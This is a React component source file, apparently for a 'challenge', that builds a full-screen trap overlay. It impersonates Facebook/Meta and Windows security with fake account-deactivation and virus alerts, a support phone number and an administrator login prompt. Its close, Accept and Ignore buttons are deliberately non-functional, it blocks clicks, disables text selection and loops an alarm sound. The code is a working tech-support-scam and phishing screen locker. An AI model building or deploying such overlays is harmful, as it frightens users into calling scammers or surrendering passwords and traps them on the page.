import React, { useEffect, useState, useRef } from 'react';
import { X } from 'lucide-react';

const TrapOverlay = () => {
  const [showOverlay, setShowOverlay] = useState(true);
  const [attempts, setAttempts] = useState(0);
  const [currentPopupIndex, setCurrentPopupIndex] = useState(0);
  const audioRef = useRef(null);
  const audioContextRef = useRef(null);

  // Multiple popup configurations
  const popups = [
    {
      id: 'deactivated',
      title: 'Account Temporarily Deactivated',
      message: 'Meta has temporarily deactivated your account due to suspicious activity detected on your profile.',
      submessage: 'For security reasons, we need to verify your identity before you can continue using Facebook.',
      note: 'This is a standard security measure and your account will be restored once verification is complete.',
      showProgress: true,
      logo: 'facebook'
    },
    {
      id: 'windows-security',
      title: 'Windows Security Alert',
      message: 'Windows has been blocked due to suspicious activity.',
      submessage: 'Your computer has been infected with a virus. Please call Windows Support immediately.',
      note: 'Error Code: 0x88820 - IP Detected: 95.122.68.19',
      showProgress: false,
      logo: 'windows'
    },
    {
      id: 'admin-login',
      title: 'Administrator Login Required',
      message: 'Windows has been blocked due to suspicious activity.',
      submessage: 'Try logging in again with your Windows account and password. If you need help, contact Windows Support.',
      note: '020 4549 4912',
      showProgress: false,
      logo: 'windows',
      showInputs: true
    },
    {
      id: 'system-error',
      title: 'Critical System Error',
      message: 'Microsoft Defender found infected files but could not quarantine them due to Policy permissions.',
      submessage: 'Please scan now to delete them manually or contact System Support for assistance.',
      note: 'Your system is at risk. Immediate action required.',
      showProgress: false,
      logo: 'windows'
    },
    {
      id: 'final-warning',
      title: 'Final Security Warning',
      message: 'Your account access has been suspended for violating our terms of service.',
      submessage: 'To restore access, you must complete identity verification immediately.',
      note: 'Failure to verify within 24 hours will result in permanent account deletion.',
      showProgress: true,
      logo: 'facebook'
    }
  ];

  useEffect(() => {
    // Create continuous security warning audio using Web Audio API
    const createSecurityAudio = () => {
      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        audioContextRef.current = new AudioContext();
        
        const playWarningSound = () => {
          const ctx = audioContextRef.current;
          
          // Create oscillator for beep sound
          const oscillator = ctx.createOscillator();
          const gainNode = ctx.createGain();
          
          oscillator.connect(gainNode);
          gainNode.connect(ctx.destination);
          
          // Set frequency for alarm-like sound
          oscillator.frequency.setValueAtTime(800, ctx.currentTime);
          oscillator.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + 0.1);
          
          // Set volume
          gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
          gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
          
          oscillator.start(ctx.currentTime);
          oscillator.stop(ctx.currentTime + 0.3);
        };

        // Play sound continuously with intervals
        const intervalId = setInterval(() => {
          if (audioContextRef.current.state === 'suspended') {
            audioContextRef.current.resume();
          }
          playWarningSound();
          
          // Double beep pattern
          setTimeout(() => {
            playWarningSound();
          }, 400);
        }, 2000);

        audioRef.current = intervalId;

        // Initial play after user interaction
        document.addEventListener('click', () => {
          if (audioContextRef.current.state === 'suspended') {
            audioContextRef.current.resume();
          }
        }, { once: true });

      } catch (error) {
        console.error('Audio creation failed:', error);
      }
    };

    createSecurityAudio();

    // Listen for trap restoration events
    const handleRestore = () => {
      setShowOverlay(true);
      setAttempts(prev => prev + 1);
    };

    window.addEventListener('restoreTrap', handleRestore);

    // Prevent any click-through
    const preventClick = (e) => {
      if (showOverlay) {
        e.stopPropagation();
        e.preventDefault();
      }
    };

    document.addEventListener('click', preventClick, { capture: true });

    return () => {
      window.removeEventListener('restoreTrap', handleRestore);
      document.removeEventListener('click', preventClick, { capture: true });
      
      // Cleanup audio
      if (audioRef.current) {
        clearInterval(audioRef.current);
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
      }
    };
  }, [showOverlay]);

  // This close button is a TRAP - it doesn't actually work
  const handleClose = (e) => {
    e.preventDefault();
    e.stopPropagation();
    // Fake animation
    setShowOverlay(false);
    setTimeout(() => {
      setShowOverlay(true);
      setAttempts(prev => prev + 1);
    }, 500);
  };

  const handleAccept = (e) => {
    e.preventDefault();
    e.stopPropagation();
    
    // Close current popup and show next one
    if (currentPopupIndex < popups.length - 1) {
      setCurrentPopupIndex(prev => prev + 1);
    } else {
      // Loop back to first popup
      setCurrentPopupIndex(0);
    }
    
    setAttempts(prev => prev + 1);
  };

  const handleIgnore = (e) => {
    e.preventDefault();
    e.stopPropagation();
    // Another trap - just increment attempts
    setAttempts(prev => prev + 1);
  };

  if (!showOverlay) return null;

  const currentPopup = popups[currentPopupIndex];

  return (
    <div 
      id="fb-trap-overlay"
      className="fixed inset-0 z-[999999999] flex items-center justify-center"
      style={{
        background: 'linear-gradient(135deg, rgba(10,10,10,0.98) 0%, rgba(20,20,20,0.99) 100%)',
        backdropFilter: 'blur(10px)',
        WebkitBackdropFilter: 'blur(10px)',
        pointerEvents: 'all',
        userSelect: 'none',
        WebkitUserSelect: 'none',
        MozUserSelect: 'none',
        msUserSelect: 'none'
      }}
    >
      {/* Hidden attempt counter for debugging (part of the challenge) */}
      <div style={{ display: 'none' }} data-attempts={attempts}></div>
      
      {/* Fake Close Button */}
      <button
        onClick={handleClose}
        className="absolute top-4 right-4 text-white/40 hover:text-white/60 transition-colors z-[1000000000]"
        style={{ cursor: 'pointer' }}
      >
        <X size={32} />
      </button>

      {/* Main Modal */}
      <div 
        className="relative max-w-2xl w-full mx-4"
        style={{
          background: 'linear-gradient(135deg, #1877f2 0%, #0e5fc5 100%)',
          borderRadius: '24px',
          padding: '48px',
          boxShadow: '0 30px 90px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1)',
          animation: 'modalPulse 3s ease-in-out infinite'
        }}
      >
        {/* Facebook Logo */}
        <div className="flex justify-center mb-8">
          <svg width="80" height="80" viewBox="0 0 36 36" fill="white">
            <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
            <path fill="#1877f2" d="M13.651 35.871v-11.87H9.936V18h3.715v-2.36c0-6.493 2.36-10.64 9.304-10.64l3.71.005v5.995h-2.531c-2.467 0-3.199 1.745-3.199 3.264V18h5.905l-1.296 6h-4.61v11.87h-6.283Z"></path>
          </svg>
        </div>

        {/* Title */}
        <h1 
          className="text-white text-center mb-6"
          style={{
            fontSize: '42px',
            fontWeight: '800',
            textShadow: '0 4px 12px rgba(0,0,0,0.5)',
            letterSpacing: '-0.02em'
          }}
        >
          Account Temporarily Deactivated
        </h1>

        {/* Message */}
        <div className="text-white/90 text-center space-y-4 mb-8">
          <p style={{ fontSize: '18px', lineHeight: '1.6' }}>
            Meta has temporarily deactivated your account due to suspicious activity detected on your profile.
          </p>
          <p style={{ fontSize: '16px', lineHeight: '1.6', opacity: 0.8 }}>
            For security reasons, we need to verify your identity before you can continue using Facebook.
          </p>
          <p style={{ fontSize: '14px', lineHeight: '1.6', opacity: 0.6 }}>
            This is a standard security measure and your account will be restored once verification is complete.
          </p>
        </div>

        {/* Fake Progress Bar */}
        <div className="mb-8">
          <div className="w-full h-2 bg-white/20 rounded-full overflow-hidden">
            <div 
              className="h-full bg-white/80"
              style={{
                width: '67%',
                animation: 'progressPulse 2s ease-in-out infinite'
              }}
            ></div>
          </div>
          <p className="text-white/60 text-center text-sm mt-2">Verifying account security...</p>
        </div>

        {/* Action Buttons (Both are traps) */}
        <div className="flex gap-4 justify-center">
          <button
            onClick={handleAccept}
            className="px-8 py-4 bg-white text-[#1877f2] font-bold rounded-xl text-lg hover:bg-white/90 transition-all transform hover:scale-105"
            style={{
              boxShadow: '0 8px 24px rgba(255,255,255,0.2)',
              cursor: 'pointer'
            }}
          >
            Accept
          </button>
          <button
            onClick={handleIgnore}
            className="px-8 py-4 bg-white/10 text-white font-bold rounded-xl text-lg hover:bg-white/20 transition-all transform hover:scale-105"
            style={{
              boxShadow: '0 8px 24px rgba(0,0,0,0.2)',
              cursor: 'pointer'
            }}
          >
            Ignore
          </button>
        </div>

        {/* Fine Print */}
        <p className="text-white/40 text-center text-xs mt-8">
          Attempting to close this window may result in permanent account suspension.
        </p>
      </div>

      {/* CSS Animations */}
      <style>{`
        @keyframes modalPulse {
          0%, 100% { transform: scale(1); box-shadow: 0 30px 90px rgba(0,0,0,0.8); }
          50% { transform: scale(1.02); box-shadow: 0 35px 100px rgba(0,0,0,0.9); }
        }
        
        @keyframes progressPulse {
          0%, 100% { opacity: 0.8; }
          50% { opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default TrapOverlay;
